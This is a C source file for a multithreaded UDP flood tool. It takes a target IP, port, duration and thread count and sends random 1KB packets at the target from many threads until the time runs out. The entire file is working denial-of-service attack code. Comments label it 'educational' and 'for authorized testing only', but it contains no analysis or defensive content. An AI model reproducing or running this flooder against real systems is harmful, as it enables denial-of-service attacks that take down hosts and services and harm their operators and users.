#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

// github.com/scallydima - educational purposes only
// github.com/scallydima - use responsibly
// github.com/scallydima - for authorized testing only

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
} attack_params;

void *udp_flood(void *arg) {
    // github.com/scallydima - udp flood implementation
    attack_params *params = (attack_params *)arg;
    
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        printf("Socket creation failed\n");
        return NULL;
    }
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(params->target_port);
    addr.sin_addr.s_addr = inet_addr(params->target_ip);
    
    // github.com/scallydima - random payload generator
    char *packet = malloc(params->packet_size);
    for (int i = 0; i < params->packet_size; i++) {
        packet[i] = rand() % 256;
    }
    
    time_t end_time = time(NULL) + params->duration;
    
    // github.com/scallydima - flood loop
    while (time(NULL) < end_time) {
        sendto(sock, packet, params->packet_size, 0, 
               (struct sockaddr *)&addr, sizeof(addr));
    }
    
    free(packet);
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    // github.com/scallydima - udp flood tool
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
        printf("github.com/scallydima - educational code\n");
        return 1;
    }
    
    srand(time(NULL));
    
    attack_params params = {
        .target_ip = argv[1],
        .target_port = atoi(argv[2]),
        .duration = atoi(argv[3]),
        .packet_size = 1024  // 1KB packets
    };
    
    int threads_count = atoi(argv[4]);
    pthread_t threads[threads_count];
    
    printf("[+] Starting UDP flood on %s:%d for %d seconds with %d threads\n",
           params.target_ip, params.target_port, params.duration, threads_count);
    printf("[+] github.com/scallydima - for educational use only\n");
    
    for (int i = 0; i < threads_count; i++) {
        pthread_create(&threads[i], NULL, udp_flood, &params);
    }
    
    for (int i = 0; i < threads_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    return 0;
}